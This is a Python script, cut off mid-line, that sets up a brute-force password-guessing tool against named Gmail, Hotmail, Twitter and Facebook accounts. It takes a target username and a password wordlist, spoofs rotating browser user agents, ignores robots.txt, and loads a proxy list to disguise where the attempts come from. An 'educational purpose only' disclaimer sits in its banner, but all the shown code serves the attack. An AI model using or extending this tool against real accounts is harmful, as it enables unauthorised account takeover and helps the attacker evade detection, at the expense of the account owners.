#!/usr/bin/python3

# note: Modules :Proxylist,mechanize,cookielib are not inbuilt in python and needs to be installed through Pip3

import smtplib
import threading
from optparse import *


try:
    from proxylist import ProxyList
except:
    print("Please install module 'Proxylist'\nPip3 install proxylist ")
try:
    from mechanize import Browser
except:
    print("Please install module 'Mechanize'\nPip3install mechanize ")

import sys
import logging
import io
import random

try:
    import cookielib
except:
    import http.cookiejar as cookielib
try:
    import mechanize
except:
    print("Plese install module 'Mechanize'\nPip3install mechanize ")

# Colours for texts
R = '\033[31m'       # red
G = '\033[32m'       # green
W = '\033[0m'        # reset color
Y = '\u001b[33m'       # Yellow
blink = '\u001b[05m'  # Blink text

use = OptionParser("""{}

     /$$$$$$$                        /$$               /$$                     /$$$$$$$$ /$$   /$$
    | $$  $$                      | $$              | $$                    | $$___/| $$  / $$
    | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$ | $$                    | $$      |  $$/ $$/
    | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   |____  $$| $$       /$$$$$$      | $$$$$    \  $$$$/
    | $$  $$| $$  \/| $$  | $$  | $$      /$$$$$$$| $$      |____/      | $$/     >$$  $$
    | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$__  $$| $$                    | $$       /$$/\  $$
    | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$                    | $$      | $$  \ $$
    |_____/ |/       \____/    \_/   \_____/|/                    |/      |/  |__/

            [ C O D E D  by:  Anirudh]          [DISCLAIMER: FOR EDUCATIONAL PURPOSE ONLY !]


xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-g  (OR)  --gmail                             Eg. -g example@gmail.com -l wordlist.txt
-t  (OR)  --hotmail                           Eg. -t example@hotmail.com -l wordlist.txt
-T  (OR)  --twitter                           Eg. -T example_tweet -l wordlist.txt
-f  (OR)  --facebook                          Eg. -f example@gmail.com -l wordlist.txt
-l  (OR)  --list                              provide wordlist name
-p  (OR)  --password                          Try Single  Password
-X  (OR)  --proxy                             show Proxy list

          """.format(G, W))

use.add_option("-g", "--gmail", dest="gmail",
               help="provide Your Target Gmail username")
use.add_option("-t", "--hotmail", dest="hotmail",
               help="provide Your Target Hotmail username")
use.add_option("-T", "--twitter", dest="twitter",
               help="provide Your Target twitter username")
use.add_option("-f", "--facebook", dest="facebook",
               help="provide Your Target Facebook username")
use.add_option("-l", "--list", dest="list_password",
               help="Provide Your PASSWORD wordlist")
use.add_option("-p", "--password", dest="password",
               help="Try a single password Guess.")
use.add_option("-X", "--proxy", dest="proxy", help="Proxy list ")

(options, args) = use.parse_args()

brows = Browser()
brows.set_handle_robots(False)
brows._factory.is_html = True
brows.set_cookiejar(cookielib.LWPCookieJar())
useragents = [
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
    'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6']
brows.addheaders = [('User-agent', random.choice(useragents))]
brows.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
proxyList = options.proxy


def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit('[!] Proxy File format is incorrect\nBye...')
    pl.rand
